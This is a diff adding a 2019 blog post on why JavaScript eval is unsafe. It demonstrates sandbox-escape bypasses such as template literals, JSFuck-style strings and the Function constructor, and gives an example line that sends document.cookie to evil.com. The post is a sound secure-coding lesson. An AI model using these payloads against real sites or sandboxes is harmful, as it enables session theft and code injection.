@@ -1,0 +1,302 @@
+<!doctype html>
+<html>
+  <head>
+    <title>(Un)safe code evaluation in JavaScript - by Thomas Heyenbrock</title>
+  </head>
+  <body style="max-width: 80ch">
+    <nav>
+      <a href="/">Home</a>
+      <span>&middot;</span>
+      <a href="/blog">Blog</a>
+      <span>&middot;</span>
+      <a href="/talks">Talks</a>
+      <span>&middot;</span>
+      <a href="https://github.com/thomasheyenbrock">GitHub</a>
+      <span>&middot;</span>
+      <a href="https://www.linkedin.com/in/thomas-heyenbrock/"> LinkedIn </a>
+      <span>&middot;</span>
+      <a href="https://x.com/heyenbrock">X</a>
+    </nav>
+
+    <aside
+      style="
+        margin-block-start: 1em;
+        margin-block-end: 1em;
+        border-left-width: 2px;
+        border-left-style: solid;
+        padding-left: 8px;
+      "
+    >
+      This blog post has also been published on my
+      <a
+        href="https://medium.com/@thomasheyenbrock/un-safe-code-evaluation-in-javascript-eeb8feaac5a8"
+        >Medium account</a
+      >.
+    </aside>
+
+    <p>Published on <time datetime="2019-06-03">June 3, 2019</time></p>
+
+    <h1>(Un)safe code evaluation in JavaScript</h1>
+
+    <section>
+      <p>Let's talk about <code>eval</code> in JavaScript.</p>
+      <p>
+        You probably have heard about it. If not, the
+        <a
+          href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval"
+        >
+          MDN documentation
+        </a>
+        will tell you all you want to know. In short, it is a function that
+        tries to evaluate a string as JavaScript code.
+      </p>
+      <p>
+        If this sounds dangerous to you, then you are right. It is! If an
+        attacker can control the string that you pass into this function, he can
+        basically do anything he desires. That reaches from XSS attacks in the
+        browser to server-side injection attacks in Node.js. 😱
+      </p>
+      <p>Here are some one-liners to break stuff:</p>
+      <figure>
+        <pre>eval("process.kill(0)");</pre>
+        <figcaption>Kill the current process in Node.js.</figcaption>
+      </figure>
+      <figure>
+        <pre>eval("document.body.innerHTML=''");</pre>
+        <figcaption>Erase all visible content on any web page.</figcaption>
+      </figure>
+      <p>
+        If the website under attack doesn't have any type of CSP, we could even
+        steal the users cookies with one line of code by making a request to a
+        website under our control:
+      </p>
+      <figure>
+        <pre>eval("fetch('https://evil.com?v=' + document.cookie)")</pre>
+      </figure>
+    </section>
+
+    <section>
+      So here's the question: Can we make it safe to use eval ? Let's go with
+      our first example where we kill the current node process.
+    </section>
+
+    <section>
+      <p>
+        Our first idea might be something like searching the string for brackets
+        to avoid function invocation:
+      </p>
+      <figure>
+        <pre>
+const code = "process.kill(0);";
+
+if (/\(|\)/.test(code)) {
+  throw new Error("Invalid code!");
+}
+
+eval(code);</pre
+        >
+      </figure>
+      <p>
+        This works for the given code. But we can easily bypass this by using
+        <a
+          href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#Tagged_templates"
+        >
+          template literals</a
+        >:
+      </p>
+      <figure>
+        <pre>
+const code = "process.kill`0`;";
+
+if (/\(|\)/.test(code)) {
+  throw new Error("Invalid code!");
+}
+
+eval(code);</pre
+        >
+      </figure>
+      <p>No more brackets, function execution none the less. 😕</p>
+      <p>
+        Well then why don't we just search for the word <code>kill</code> inside
+        the string of code?
+      </p>
+      <figure>
+        <pre>
+const code = "process.kill(0);";
+
+if (/kill/.test(code)) {
+  throw new Error("Invalid code!");
+}
+
+eval(code);</pre
+        >
+      </figure>
+      <p>
+        Now we will be safe, right? Not exactly. It turns out that there are
+        countless ways to write <code>kill</code> without actually writing the
+        exact string.
+      </p>
+      <p>
+        You can actually write anything (and also evaluate anything) using just
+        the six characters <code>(</code>, <code>)</code>, <code>[</code>,
+        <code>]</code>, <code>!</code> and <code>+</code>. Check out
+        <a href="http://www.jsfuck.com/">JSFuck</a> for a demo!
+      </p>
+      <p>
+        Let's apply this here and use the fact that running
+        <code>(![]+[])[!+[]+!+[]]</code>
+        will return the string <code>l</code>:
+      </p>
+      <figure>
+        <pre>
+const code = "process['kil' + (![]+[])[!+[]+!+[]]](0);";
+
+if (/\(|\)/.test(code)) {
+  throw new Error("Invalid code!");
+}
+
+eval(code);</pre
+        >
+      </figure>
+      <p>Again, security check bypassed! 😕 😢</p>
+      <p>
+        So let's give up on trying to search the string for bad code. Let's do
+        something more clever! If we don't want the code to access the
+        <code>process</code> object, then why don't we "override" it. So that we
+        don't actually override it we use a IIFE, taking advantage of
+        JavaScripts lexical scoping. (That means that the
+        <code>process</code> variable defined inside the function will not
+        override the global object, but rather replace it for the scope of the
+        current function.)
+      </p>
+      <figure>
+        <pre>
+const code = "process.kill(0);";
+
+(() => {
+  const process = {};
+  eval(code);
+})()</pre
+        >
+      </figure>
+      <p>
+        If we run this code we will get an error, stating that
+        <code>process.kill</code> is not a function. (Indeed it isn't, because
+        it is just <code>undefined</code>!) Perfect, right?
+      </p>
+      <p>
+        Well, as you might have guesses there is a way to get around this, too.
+        For this we will use the
+        <a
+          href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function"
+        >
+          <code>Function</code> constructor</a
+        >. It kind of works like <code>eval</code>, in the sense that it accepts
+        a string which will be evaluated each time the resulting function is
+        called.
+      </p>
+      <p>
+        But there is a subtle difference. When we define a function using the
+        constructor, the function doesn't create its own closure. The function
+        will always be executed within the global scope! (This behaviour can
+        also be found in the
+        <a
+          href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function#Difference_between_Function_constructor_and_function_declaration"
+        >
+          documentation</a
+        >.)
+      </p>
+      <p>
+        We can use this to break free of the closure of the IIFE. That means we
+        should be able to access the global process object again. Let's try it
+        out:
+      </p>
+      <figure>
+        <pre>
+const code = "Function('process.exit(0)')()";
+
+(() => {
+  const process = {};
+  eval(code);
+})()</pre
+        >
+      </figure>
+      <p>We also cracked this one! 😕 😢 😰</p>
+      <p>
+        But what if we also override the <code>Function</code> object as well?
+        Won't this save our problem?
+      </p>
+      <figure>
+        <pre>
+const code = "Function('process.exit(0)')()";
+
+(() => {
+  const Function = {};
+  const process = {};
+  eval(code);
+})()</pre
+        >
+      </figure>
+      <p>
+        Yes, it prevents this exact code from executing. But like it was the
+        case with strings before, we can get access to the
+        <code>Function</code> constructor in a countless number of ways in
+        JavaScript. It is as easy as accessing the
+        <code>constructor</code> property of a variable that is a function. To
+        give you some impressions, all of those expressions are
+        <code>true</code>:
+      </p>
+      <figure>
+        <pre>
+(() => {}).constructor === Function;
+String.constructor === Function;
+(0).constructor.constructor === Function;
+true.constructor.constructor === Function;
+[].constructor.constructor === Function;
+process.constructor.constructor === Function;</pre
+        >
+      </figure>
+      <p>
+        We can just choose one of those and we will make our exploit work again:
+      </p>
+      <figure>
+        <pre>
+const code = "[].constructor.constructor('process.exit(0)')()";
+
+(() => {
+  const Function = {};
+  const process = {};
+  eval(code);
+})()</pre
+        >
+      </figure>
+      <p>Secure code evaluation no more... 😕 😢 😰 😭</p>
+    </section>
+    <section>
+      <p>
+        In the end I'm not a security export and still I can come up with quite
+        simple ideas to bypass many of those checks. (I always wonder what
+        professional hackers could come up with...)
+      </p>
+      <p>
+        Maybe I'm wrong after all and there is a way to make code evaluation
+        bullet proof. If so then please let me know! 😉
+      </p>
+    </section>
+    <section>
+      <p>
+        If you make it this far, my message should be clear: Don't use
+        <code>eval</code> to evaluate code or <code>Function</code> to create
+        functions, if the string you pass in there is not 100% controlled by
+        you!
+      </p>
+      <p>
+        In fact <code>setTimeout</code> and <code>setInterval</code> are just as
+        dangerous. The first argument doesn't have to be a function, is can also
+        be a string! This string will then be evaluated after the timeout or
+        after each interval.
+      </p>
+      <p>Stay safe and have fun! 🎉</p>
+    </section>
+  </body>
+</html>
